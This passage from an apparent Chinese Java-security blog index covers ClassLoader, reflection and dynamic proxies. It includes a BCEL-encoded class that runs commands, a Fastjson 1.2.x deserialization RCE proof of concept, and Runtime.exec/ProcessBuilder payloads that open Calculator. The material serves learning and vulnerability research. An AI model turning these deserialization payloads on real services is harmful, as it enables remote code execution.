50, 0, 56, 10, 0, 15, 0, 26, 8, 0, 27, 8, 0, 28, 10, 0, 29, 0, 30, 8, 0, 31, 10, 0, 32, 0, 33, 8, 0, 34, 8, 0, 35, 8, 0, 36, 10, 0, 37, 0, 38, 10, 0, 37, 0, 39, 7, 0, 40, 10, 0, 12, 0, 41, 7, 0, 42, 7, 0, 43, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 8, 60, 99, 108, 105, 110, 105, 116, 62, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 44, 7, 0, 40, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 18, 84, 101, 115, 116, 66, 67, 69, 76, 67, 108, 97, 115, 115, 46, 106, 97, 118, 97, 12, 0, 16, 0, 17, 1, 0, 22, 111, 112, 101, 110, 32, 45, 97, 32, 67, 97, 108, 99, 117, 108, 97, 116, 111, 114, 46, 97, 112, 112, 1, 0, 7, 111, 115, 46, 110, 97, 109, 101, 7, 0, 45, 12, 0, 46, 0, 47, 1, 0, 7, 87, 105, 110, 100, 111, 119, 115, 7, 0, 44, 12, 0, 48, 0, 49, 1, 0, 22, 99, 97, 108, 99, 32, 49, 50, 51, 52, 53, 54, 55, 56, 57, 48, 49, 50, 51, 52, 53, 54, 55, 1, 0, 5, 76, 105, 110, 117, 120, 1, 0, 20, 99, 117, 114, 108, 32, 108, 111, 99, 97, 108, 104, 111, 115, 116, 58, 57, 57, 57, 57, 47, 7, 0, 50, 12, 0, 51, 0, 52, 12, 0, 53, 0, 54, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, 55, 0, 17, 1, 0, 39, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47, 115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115, 116, 66, 67, 69, 76, 67, 108, 97, 115, 115, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 1, 0, 11, 103, 101, 116, 80, 114, 111, 112, 101, 114, 116, 121, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 115, 116, 97, 114, 116, 115, 87, 105, 116, 104, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 90, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 1, 0, 10, 103, 101, 116, 82, 117, 110, 116, 105, 109, 101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 59, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 15, 112, 114, 105, 110, 116, 83, 116, 97, 99, 107, 84, 114, 97, 99, 101, 0, 33, 0, 14, 0, 15, 0, 0, 0, 0, 0, 2, 0, 1, 0, 16, 0, 17, 0, 1, 0, 18, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 19, 0, 0, 0, 6, 0, 1, 0, 0, 0, 5, 0, 8, 0, 20, 0, 17, 0, 1, 0, 18, 0, 0, 0, -106, 0, 2, 0, 3, 0, 0, 0, 53, 18, 2, 75, 18, 3, -72, 0, 4, 76, 43, 18, 5, -74, 0, 6, -103, 0, 9, 18, 7, 75, -89, 0, 15, 43, 18, 8, -74, 0, 6, -103, 0, 6, 18, 9, 75, -72, 0, 10, 42, -74, 0, 11, 87, -89, 0, 8, 77, 44, -74, 0, 13, -79, 0, 1, 0, 36, 0, 44, 0, 47, 0, 12, 0, 2, 0, 19, 0, 0, 0, 46, 0, 11, 0, 0, 0, 8, 0, 3, 0, 9, 0, 9, 0, 11, 0, 18, 0, 12, 0, 24, 0, 13, 0, 33, 0, 14, 0, 36, 0, 18, 0, 44, 0, 21, 0, 47, 0, 19, 0, 48, 0, 20, 0, 52, 0, 22, 0, 21, 0, 0, 0, 19, 0, 4, -3, 0, 24, 7, 0, 22, 7, 0, 22, 11, 74, 7, 0, 23, -7, 0, 4, 0, 1, 0, 24, 0, 0, 0, 2, 0, 25 }; /** * 将一个Class文件编码成BCEL类 * * @param classFile Class文件路径 * @return 编码后的BCEL类 * @throws IOException 文件读取异常 */ // public static String bcelEncode(File classFile) throws IOException { // return \u0026#34;$$BCEL$$\u0026#34; + Utility.encode(FileUtils.readFileToByteArray(classFile), true); // } /** * BCEL命令执行示例，测试时请注意兼容性问题：① 适用于BCEL 6.0以下。② JDK版本为：JDK1.5 - 1.7、JDK8 - JDK8u241、JDK9 * * @throws Exception 类加载异常 */ public static void bcelTest() throws Exception { // 使用反射是为了防止高版本JDK不存在com.sun.org.apache.bcel.internal.util.ClassLoader类 Class\u0026lt;?\u0026gt; bcelClass = Class.forName(\u0026#34;com.sun.org.apache.bcel.internal.util.ClassLoader\u0026#34;); // 创建BCEL类加载器 ClassLoader classLoader = (ClassLoader) bcelClass.newInstance(); // ClassLoader classLoader = new com.sun.org.apache.bcel.internal.util.ClassLoader(); // ClassLoader classLoader = new com.sun.org.apache.bcel.internal.util.ClassLoader() // BCEL编码类字节码 String className = \u0026#34;$$BCEL$$\u0026#34; + Utility.encode(CLASS_BYTES, true); System.out.println(className); Class\u0026lt;?\u0026gt; clazz = Class.forName(className, true, classLoader); System.out.println(clazz); } /** * Fastjson 1.1.15 - 1.2.4 反序列化RCE示例，示例程序考虑到测试环境的兼容性，采用的都是Apache commons dbcp和bcel * * @throws IOException BCEL编码异常 */ public static void fastjsonRCE() throws IOException { // BCEL编码类字节码 String className = \u0026#34;$$BCEL$$\u0026#34; + Utility.encode(CLASS_BYTES, true); // 构建恶意的JSON Map\u0026lt;String, Object\u0026gt; dataMap = new LinkedHashMap\u0026lt;String, Object\u0026gt;(); Map\u0026lt;String, Object\u0026gt; classLoaderMap = new LinkedHashMap\u0026lt;String, Object\u0026gt;(); dataMap.put(\u0026#34;@type\u0026#34;, BasicDataSource.class.getName()); dataMap.put(\u0026#34;driverClassName\u0026#34;, className); classLoaderMap.put(\u0026#34;@type\u0026#34;, org.apache.bcel.util.ClassLoader.class.getName()); dataMap.put(\u0026#34;driverClassLoader\u0026#34;, classLoaderMap); String json = JSON.toJSONString(dataMap); System.out.println(json); JSONObject jsonObject = JSON.parseObject(json); System.out.println(jsonObject); } public static void main(String[] args) throws Exception { // bcelTest(); fastjsonRCE(); } } Xalan ClassLoader Xalan和BCEL一样都经常被用于编写反序列化Payload，Oracle JDK默认也引用了Xalan，同时修改了原包名org.apache.xalan.xsltc.trax.TemplatesImpl为com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，Xalan最大的特点是可以传入类字节码并初始化（需要调用getOutputProperties方法），从而实现RCE，比如Fastjson和Jackson会使用反射调用getter/setter或成员变量映射的方式实现JSON反序列化。\nTemplatesImpl中有一个_bytecodes成员变量，用于存储类字节码，通过JSON反序列化的方式可以修改该变量值，但因为该成员变量没有可映射的get/set方法所以需要修改JSON库的虚拟化配置，比如Fastjson解析时必须启用Feature.SupportNonPublicField、Jackson必须开启JacksonPolymorphicDeserialization（调用mapper.enableDefaultTyping()），所以利用条件相对较高。\n这里发现其实是之前分析的fastJson1.2.24的TemplatesImpl 反序列化链一样,\n详情之前的看博客关于templateImpl链的学习。\n值得注意的是恶意类必须要继承AbstractTranslet。\n","permalink":"http://www.reus09.top/posts/tech/java%E4%B9%8Bclassloader/","summary":"这篇主要记录一下对于classloader的学习。 类加载机制 Java中的源码.java后缀文件会在运行前被编译成.class后缀文件，文件内","title":"Java之ClassLoader"},{"content":"前不久学习了动态代理的一些知识，然后跟着p神的代码审计知识星球进行初步学习，结合su18师傅的JavaSec项目，一些相关博客，对Java反射进行了学习。感觉p神的相关介绍更加的贴近原理、一些小trick。\n反射是⼤多数语⾔⾥都必不可少的组成部分，对象可以通过反射获取他的类，类可以通过反射拿到所有⽅法（包括私有），拿到的⽅法可以调⽤，总之通过“反射”，我们可以将Java这种静态语⾔附加上动态特性。\n反射的作用 比如对于这样一段代码，如何不传入具体参数，并不知道具体作用是什么\n1 2 3 4 public void execute(String className, String methodName) throws Exception { Class clazz = Class.forName(className); clazz.getMethod(methodName).invoke(clazz.newInstance()); } 上面的例子，运用了反射里极为重要的方法\n获取类的方法:forName 实例化对象的方法:newInstance 获取函数的方法:getMethod 执行函数的方法:invoke 基本上，这几个方法包揽了Java安全里面的与反射相关的payload\n获取class对象 forName并不是获取“类”的唯一途径，获取“类”的方式很多，也就是java.lang.Class对象。\nobj.getClass()如果上下文存在某个类的实例obj,我们可以通过obj.getClass()来获取对应的类 Test.class 如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接 拿它的 class 属性即可。这个⽅法其实不属于反射。 Class.forName 如果知道某个类的名字，想要获取到这个类，就可以使用forName来获取 classLoader.loadClass(\u0026quot;\u0026quot;) 同样，如果知道某个类的名字，也可以通过classLoader的loadClass方法来实现获取 获取数组类型的Class对象需要特殊注意,需要使用Java类型的描述符方式，如下：\n1 2 Class\u0026lt;?\u0026gt; doubleArray = Class.forName(\u0026#34;[D\u0026#34;);//相当于double[].class Class\u0026lt;?\u0026gt; cStringArray = Class.forName(\u0026#34;[[Ljava.lang.String;\u0026#34;);// 相当于String[][].class forName有两个函数重载：\n第⼀个就是我们最常见的获取class的⽅式，其实可以理解为第⼆种⽅式的⼀个封装：\n1 2 3 Class.forName(className) // 等于 Class.forName(className, true, currentLoader) 默认情况下， forName 是的第⼀个参数是类名；第⼆个参数表示是否初始化；第三个参数就是ClassLoader。\nJava类装载的过程 加载\nJvm把class文件字节码加载到内存中，并将这些静态数据装换成运行时数据区中方法区的类型数据，在运行时数据区堆中生成一个代表这个类的java.lang.Class对象，作为方法区类数据的访问入口。 注：方法区不仅仅是存放方法，它存放的是类的类型信息。 链接：执行下面的校验、准备和解析步骤，其中解析步骤是可选的\n校验：检查加载的class文件的正确性和安全性\n准备：为类变量分配存储空间并设置类变量初始值，类变量随类型信息存放在方法区中,生命周期很长，使用不当和容易造成内存泄漏。\n注：类变量就是static变量；初始值指的是类变量类型的默认值而不是实际要赋的值\n解析：jvm将常量池内的符号引用转换为直接引用\n初始化：执行类变量赋值和静态代码块\n对于是否初始化，这个概念结合p神的demo以及相关jvm中类加载的机制的理解：初始化指的是激活类的静态变量的初始化Java代码和静态Java代码块，并初始化程序员设置的变量值。\n如果设置initalize=flase，则装载过程中链接不会进行，因此也不会初始化。另外，对于forName获得的“class”来说，在此过程中，不同代码块、构造函数都不会初始化，只有调用了newInstance()方法才可以调用构造函数，创建类的对象。\n以如下类为例子，研究一下static代码块、普通代码块、构造函数调用顺序。\n1 2 3 4 5 6 7 8 9 10 11 12 public class Demo { private int a; { System.out.printf(\u0026#34;Empty block initial %s\\n\u0026#34;, this.getClass()); } static { System.out.printf(\u0026#34;Static initial %s\\n\u0026#34;,ReflectTest.class); } public Demo() { System.out.printf(\u0026#34;Initial %s\\n\u0026#34;, this.getClass()); } } 设置false状态 设置true状态 newInstance static {} 就是在forName()中initalize=true的时候调⽤的，⽽{}中的代码会放在newInstance实例化类的时候运行，在构造函数的 super()后⾯，但在当前构造函数内容的前⾯。\n所以在实际运用的时候，我们可以在static中写入恶意代码构成恶意类，当程序远程加载恶意类，产生反序列化的时候就会触发。\nRuntime单例模式反射 Java的普通类C1中支持编写内部类 C2 ,而在编译的时候，会生成两个文件： C1.class 和C1$C2.class，我们可以把他们看作两个无关的类，通过 Class.forName(\u0026quot;C1$C2\u0026quot;) 即可加载这个内部类。\nclass.newInstance作用是调用这个类的无参数构造，但是如果类没有无参数构造函数或者使用的类构造函数是私有的，就无法正常运行。\n对于java.lang.Runtime来说，我们经常使用这个类来执行Payload,但是不能直接来执行命令\n1 2 3 Class clazz = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); clazz.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(clazz.newInstance(), \u0026#34;id\u0026#34;); // java.lang.Runtime.exec(\u0026#34;id\u0026#34;) 会产生报错\n原因是Runtime类构造方法私有的。这个就是很常见的设计模式:单例模式。\n以java.lang.Runtime为例：\n类在初始化的时候会执行一次构造函数，之后只能通过getRuntime来获取Runtime()对象，我们将上述payload进行修改。\n1 2 3 4 Class clazz = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); clazz.getMethod(\u0026#34;exec\u0026#34;,String.class).invoke(clazz.getMethod(\u0026#34;getRuntime\u0026#34;).invoke(clazz),\u0026#34;open -a Calculator.app\u0026#34;) //java.lang.Runtime.getRuntime().exec(\u0026#34;open -a Calculator.app\u0026#34;) 我们也可以将上述代码进行拆分：\n1 2 Class clazz = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Method execMethod = clazz.getMethod(\u0026#34;exec\u0026#34;, String.class); Method getRuntimeMethod = clazz.getMethod(\u0026#34;getRuntime\u0026#34;); Object runtime = getRuntimeMethod.invoke(clazz); execMethod.invoke(runtime, \u0026#34;open -a Calculator.app\u0026#34;); 这里因为getRuntime为静态方法，所以需要传入class，exec为正常的方法，所以传入对应的实例类。\nConstructor使用 对于问题:\n如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类 呢？ 如果一个方法或构造方法是私有方法，我们是否能执行它呢？ 对于第一个问题，我们需要用到getConstructor.\n和 getMethod 类似， getConstructor接收的参数是构造函数列表类型，因为构造函数也支持重载，所以必须用参数列表类型才能唯一确定一个构造函数。获取到构造函数后，我们使用newInstance来执行。\n我们常用的另一种执行命令的方式ProcessBuilder，我们使用反射来获取其构造函数，然后调用 start() 来执行命令：\n1 2 3 Class clazz = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); clazz.getMethod(\u0026#34;start\u0026#34;).invoke(clazz.getConstructor(List.class).newInstance( Arrays.asList(\u0026#34;open\u0026#34;,\u0026#34;-a\u0026#34;,\u0026#34;Calculator.app\u0026#34;))); 通过getMethod(\u0026quot;start\u0026quot;)获取到start方法，然后invoke执行，invoke的第一个参数就是ProcessBuilder Object了。\n如果使用public ProcessBuilder(String... command)这个构造函数。\njava的可变长参数，可以用...语法来表示这个函数的参数个数是可变的。\n对于可变长参数，Java其实在编译的时候会编译成一个数组，也就是说，如下这两种写法在底层是等价的(也就不能重载)：\n1 2 public void hello(String[] names) {} public void hello(String...names) {} 所以，我们将字符串数组的String[].class传给getConstructor，获取ProcessBuilder的第二类种构造函数：\n1 2 Class clazz = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); clazz.getConstructor(String[].class) 在调用newInstance的时候，因为这个函数本身接收的是一个可变长参数，我们传给ProcessBuilder 的也是一个可变长参数，二者叠加为一个二维数组，所以整个Payload如下：\n1 2 3 Class clazz = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); ((ProcessBuilder) clazz.getConstructor(String[].class).newInstance(new String[][]{{\u0026#34;open\u0026#34;,\u0026#34;-a\u0026#34;,\u0026#34;Calculator.app\u0026#34;}})).start(); 第二个问题，方法、构造方法是私有方法，\n主要设计getDeclared系列的反射，详见后面的内容对getDeclared和普通的get的区别介绍。 反射的具体使用 反射调用类方法 Class对象提供了一个获取某个类的所有的成员方法的方法，也可以通过方法名和方法参数类型来获取指定成员方法。\n获取当前类所有的成员方法:\n1 2 3 4 5 6 7 8 9 try { Class clazz = Class.forName(\u0026#34;com.reus.reflect.Demo\u0026#34;); Method[] methods = clazz.getDeclaredMethods(); for(Method method : methods){ System.out.println(method); } }catch (Exception e){ e.printStackTrace(); } 获取当前类指定的成员方法\n1 2 Method method = clazz.getDeclaredMethod(\u0026#34;方法名\u0026#34;); Method method = clazz.getDeclaredMethod(\u0026#34;方法名\u0026#34;, 参数类型如String.class，多个参数用\u0026#34;,\u0026#34;号隔开); getMethod和getDeclaredMethod都能够获取到类成员方法，区别在于*\ngetMethod只能获取到当前类和父类的所有有权限的方法(如：public) getDeclaredMethod能获取到当前类的所有成员方法(不包含父类)。 反射执行方法：获取到java.lang.reflect.Method对象以后我们可以通过Method的invoke方法来调用类方法。\n1 method.invoke(方法实例对象, 方法参数值，多个参数值用\u0026#34;,\u0026#34;隔开); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 @CallerSensitive public Object invoke(Object obj, Object... args) throws IllegalAccessException, IllegalArgumentException, InvocationTargetException { if (!override) { if (!Reflection.quickCheckMemberAccess(clazz, modifiers)) { Class\u0026lt;?\u0026gt; caller = Reflection.getCallerClass(); checkAccess(caller, clazz, obj, modifiers); } } MethodAccessor ma = methodAccessor; // read volatile if (ma == null) { ma = acquireMethodAccessor(); } return ma.invoke(obj, args); } invoke的作用是执行方法，它的第一个参数是：\n如果这个方法是一个普通方法，那么第一个参数是类实例对象 如果这个方法是一个静态方法，那么第一个参数是类 invoke的第二个参数不是必须的，如果当前调用的方法没有参数，那么第二个参数可以不传，如果有参数那么就必须严格的依次传入对应的参数类型。\n反射调用成员变量 Java反射不但可以获取类所有的成员变量名称，还可以无视权限修饰符实现修改对应的值。\n获取当前类的所有成员变量：\n1 Field fields = clazz.getDeclaredFields(); 获取当前类指定的成员变量：\n1 Field field = clazz.getDeclaredField(\u0026#34;变量名\u0026#34;); getField和getDeclaredField的区别同getMethod和getDeclaredMethod。\n获取成员变量值：\n1 Object obj = field.get(类实例对象); 修改成员变量值：\n1 field.set(类实例对象, 修改后的值); 同理，当我们没有修改的成员变量权限时可以使用: field.setAccessible(true)的方式修改为访问成员变量访问权限。\n如果我们需要修改被final关键字修饰的成员变量，那么我们需要先修改方法\n1 2 3 4 5 6 7 8 9 10 11 // 反射获取Field类的modifiers Field modifiers = field.getClass().getDeclaredField(\u0026#34;modifiers\u0026#34;); // 设置modifiers修改权限 modifiers.setAccessible(true); // 修改成员变量的Field对象的modifiers值 modifiers.setInt(field, field.getModifiers() \u0026amp; ~Modifier.FINAL); // 修改成员变量值 field.set(类实例对象, 修改后的值); ","permalink":"http://www.reus09.top/posts/tech/java%E5%8F%8D%E5%B0%84/","summary":"前不久学习了动态代理的一些知识，然后跟着p神的代码审计知识星球进行初步学习，结合su18师傅的JavaSec项目，一些相关博客，对Java反","title":"Java反射"},{"content":"实际上在之前的学习阶段复现了一些CVE漏洞，但是发现还是存在基础方面的缺陷，对Java安全缺乏系统性的整理，因此从今天这篇开始，系统的整理学习一下Java安全的基础知识，今天先学习一下java里面的动态代理。\n0x01 概念 代理模式是常用的 java 设计模式，他的特征是代理类与委托类有同样的接口，代理类主要负责为委托类预处理消息、过滤消息、把消息转发给委托类，以及事后处理消息等。代理类与委托类之间通常会存在关联关系，一个代理类的对象与一个委托类的对象关联，代理类的对象本身并不真正实现服务，而是通过调用委托类的对象的相关方法，来提供特定的服务。\n这里需要关注的重点有如下几点 - 代理类与委托类有同样的接口 - 代理类主要负责为委托类预处理消息、过滤消息等简而言之经过代理的类方法被调用后会先经过代理类的处理。 - 一个代理类的对象与一个委托类的对象关联\n从这里你能够发现其实实现代理模式需要三个东西：一个公共接口，一个具体的类，一个代理类,代理类持有具体类的实例，代为执行具体类实例方法。\n此外，我们看一下代理模式的主要角色\n抽象角色（Subject）：通过接口或抽象类声明真实主题和代理对象实现的业务方法。 真实角色（Real Subject）：实现了抽象主题中的具体业务，是代理对象所代表的真实对象，是最终要引用的对象。 代理（Proxy）：提供了与真实主题相同的接口，其内部含有对真实主题的引用，它可以访问、控制或扩展真实主题的功能。 客户 : 使用代理角色来进行一些操作。 代理模式的优点：\n代理模式在客户端与目标对象之间起到一个中介作用和保护目标对象的作用 代理对象可以扩展目标对象的功能 代理模式能将客户端与目标对象分离，在一定程度上降低了系统的耦合度，增加了程序的可扩展性 这里，我们也能够明白，代理的作用就是起一个中间件的作用，将发送给具体类的消息进行处理，是Spring里面AOP思想的基础。\n0x02 静态代理 这种代理方式需要代理对象和目标对象实现一样的接口。但是当需要代理的对象过多就需要实现大量的代理类，并且一旦接口增加方法，目标对象与代理对象都要进行修改。\n下面以一个出租房子为例子:\n抽象角色：接口Rent\n1 2 3 public interface Rent { public void rent(); } 真实角色：房东出租房子landLord\n1 2 3 4 5 6 public class landLord implements Rent{ @Override public void rent() { System.out.println(\u0026#34;房屋出租\u0026#34;); } } 代理：中介(静态代理) StaticProxy 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 public class StaticProxy implements Rent{ private landLord landLord; public StaticProxy() { } public StaticProxy(com.reus.landLord landLord) { this.landLord = landLord; } public void seeHouse(){ System.out.println(\u0026#34;看房子\u0026#34;); } public void fare(){ System.out.println(\u0026#34;中介费用\u0026#34;); } @Override public void rent() { seeHouse(); landLord.rent(); fare(); } } Client:客户\n1 2 3 4 5 6 7 System.out.println(\u0026#34;静态代理\u0026#34;); //房东要租房 landLord landlord = new landLord(); //中介帮助房东 StaticProxy staticProxy = new StaticProxy(landlord); //客户找中介 staticProxy.rent(); 在这个过程中，客户接触的是中介，看不到房东，但是依旧租到了房东的房子。同时房东省了心，客户省了事。\n但是你能很明显的感受这样的模式完成代理一个类是很容易的，但如果需要代理的类很多，那么就需要编写大量的代理类，比较繁琐。并且当接口被改变代理类同样需要改变，这样就产生了更大的局限性和更多麻烦。\n由此可以我们得知此静态代理的缺点：\n当我们的接口类需要增加和删除方式的时候，委托类和代理类都需要更改，不容易维护。\n同时如果需要代理多个类的时候，每个委托类都要编写一个代理类，会导致代理类繁多，不好管理。\n因为java静态代理是对类进行操作的，我们需要一个个代理类去实现对委托类的更改操作，针对这个情况，我们可以利用动态代理来解决，通过程序运行时自动生成代理类。\n0x03 动态代理 Java动态代理位于Java.lang.reflect包下，我们一般就仅涉及Java.lang.reflect.Proxy类与InvocationHandler接口,使用其配合反射，完成实现动态代理的操作。\nInvocationHandler接口：负责提供调用代理操作。\n是由代理对象调用处理器实现的接口，定义了一个invoke()方法，每个代理对象都有一个关联的接口。当代理对象上调用方法时，该方法会被自动转发到InvocationHandler.invoke()方法来进行调用。\nProxy类：负责动态构建代理类\n提供四个静态方法来为一组接口动态生成的代理类并返回代理类的实例对象。\ngetProxyClass(ClassLoader,Class\u0026lt;?\u0026gt;...)：获取指定类加载器和动态代理类对象。\nnewProxyInstance(ClassLoader,Class\u0026lt;?\u0026gt;[],InvocationHandler)：指定类加载器，一组接口，调用处理器；\nisProxyClass(Class\u0026lt;?\u0026gt;)：判断获取的类是否为一个动态代理类;\ngetInvocationHandler(Object)：获取指定代理类实例查找与它相关联的调用处理器实例;\n动态代理实现过程\n使用java.lang.InvocationHandler接口创建自定义调用处理器，由它来实现invoke方法，执行代理函数；\n使用java.lang.reflect.Proxy类指定一个ClassLoader，一组interface接口和一个InvocationHandler；\n通过反射机制获得动态代理类的构造方法，其唯一参数类型是调用处理器接口类型；\n调用java.lang.reflect.Proxy.newProxyInstance()方法，分别传入类加载器，被代理接口，调用处理器；创建动态代理实例对象。\n它三个参数的意义如下：\nloader，指定代理对象的类加载器 interfaces，代理对象需要实现的接口，可以同时指定多个接口 handler，方法调用的实际处理者，代理对象的方法调用都会转发到这里 Proxy.newProxyInstance会返回一个实现了指定接口的代理对象，对该对象的所有方法调用都会转发给InvocationHandler.invoke()方法。\n因此，在invoke()方法里我们可以加入任何逻辑，比如修改方法参数，加入日志功能、安全检查功能等等等等……\n通过代理对象调用目标方法；\n我们还是使用静态代理给的接口类和委托类。\n代理:中介\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 public class DynamicProxy implements InvocationHandler { // target变量为委托类对象 private Object target; public DynamicProxy(Object target) { this.target = target; } public void seeHouse(){ System.out.println(\u0026#34;看房子\u0026#34;); } public void fare(){ System.out.println(\u0026#34;中介费用\u0026#34;); } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { seeHouse(); Object result = method.invoke(target,args); fare(); return result; } public Object getProxy(){ return Proxy.newProxyInstance(target.getClass().getClassLoader(), target.getClass().getInterfaces(),this); } } Client 调用:\n1 2 3 4 System.out.println(\u0026#34;动态代理\u0026#34;); DynamicProxy dynamicProxy = new DynamicProxy(landlord); Rent proxy = (Rent) dynamicProxy.getProxy(); proxy.rent(); 通过开启System.getProperties().put(\u0026quot;sun.misc.ProxyGenerator.saveGeneratedFiles\u0026quot;,\u0026quot;true\u0026quot;);我们可以查看动态代理过程中生成的字节码文件，放在跟目录下:com.sun.proxy.$Proxy0.class\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 package com.sun.proxy; import com.reus.Rent; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; import java.lang.reflect.UndeclaredThrowableException; public final class $Proxy0 extends Proxy implements Rent { // 私有静态构造方法 private static Method m1; private static Method m3; private static Method m2; private static Method m0; // 获取调用处理器实例对象 public $Proxy0(InvocationHandler var1) throws { super(var1); } public final boolean equals(Object var1) throws { try { return (Boolean)super.h.invoke(this, m1, new Object[]{var1}); } catch (RuntimeException | Error var3) { throw var3; } catch (Throwable var4) { throw new UndeclaredThrowableException(var4); } } // 获取调用接口类的rent()方法,转发到调用处理器中的invoke()方法进行处理。 public final void rent() throws { try { super.h.invoke(this, m3, (Object[])null); } catch (RuntimeException | Error var2) { throw var2; } catch (Throwable var3) { throw new UndeclaredThrowableException(var3); } } public final String toString() throws { try { return (String)super.h.invoke(this, m2, (Object[])null); } catch (RuntimeException | Error var2) { throw var2; } catch (Throwable var3) { throw new UndeclaredThrowableException(var3); } } public final int hashCode() throws { try { return (Integer)super.h.invoke(this, m0, (Object[])null); } catch (RuntimeException | Error var2) { throw var2; } catch (Throwable var3) { throw new UndeclaredThrowableException(var3); } } // 利用反射进行类初始化，执行static静态代码块中的内容，主要是获取com.DynamicProxy.Rental接口类中的sale方法。 static { try { m1 = Class.forName(\u0026#34;java.lang.Object\u0026#34;).getMethod(\u0026#34;equals\u0026#34;, Class.forName(\u0026#34;java.lang.Object\u0026#34;)); m3 = Class.forName(\u0026#34;com.reus.Rent\u0026#34;).getMethod(\u0026#34;rent\u0026#34;); m2 = Class.forName(\u0026#34;java.lang.Object\u0026#34;).getMethod(\u0026#34;toString\u0026#34;); m0 = Class.forName(\u0026#34;java.lang.Object\u0026#34;).getMethod(\u0026#34;hashCode\u0026#34;); } catch (NoSuchMethodException var2) { throw new NoSuchMethodError(var2.getMessage()); } catch (ClassNotFoundException var3) { throw new NoClassDefFoundError(var3.getMessage()); } } } 在这里生成的$Proxy0代类中，我们可以清楚知道动态代理的实现过程。实际上我们在创建代理对象时，就是通过通过反射来获取这个类的构造方法，然后来创建的代理实例。\n0x04 简单利用 背景 存在一个接口teacher:\n1 2 3 4 public interface Teacher { Object getObject(); void attack(); } 有一个实现公共接口的类A和一个后门类\nA:\n1 2 3 4 5 6 7 8 9 10 11 12 public class A implements Teacher{ Object object; @Override public Object getObject() { return null; } @Override public void attack() { System.out.println(\u0026#34;attack\u0026#34;); } } backdoor:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import java.io.IOException; public class Backdoor implements Teacher{ @Override public Object getObject() { return null; } @Override public void attack() { try { Runtime.getRuntime().exec(\u0026#34;open /System/Applications/Calculator.app\u0026#34;); } catch (IOException e) { e.printStackTrace(); } } } proxyHandler代理类:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; public class ProxyHandler implements InvocationHandler { private A object; public ProxyHandler(Object object){ this.object = (A) object; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(\u0026#34;method is \u0026#34; + method.getName()); method.invoke(this.object.getObject(), args); return null; } } myPrxoy\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; public class myProxy implements InvocationHandler { private Object object; public myProxy(Object o){ this.object = o; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { return this.object; } } 利用 很明显我们最终的目的是需要调用到后门类里面的attack方法。如果我们能够控制ProxyHandler.invoke()中让this.object.getObject()能够返回一个Backdoor后门类实例对象就能完成attack方法调用。\n这里的通常做法就是能够寻找到一个新的代理，我们能够控制这个代理的invoke返回对象，然后用它来代理ProxyHandler中的object，当调用到this.object.getObject()进入到我们找的可利用的代理对象中控制返回对象为一个Backdoor后门类实例。所以很明显这里的myProxy就是那个新的代理。\n但是好像没有调试出来，之后再看看(x\n总结 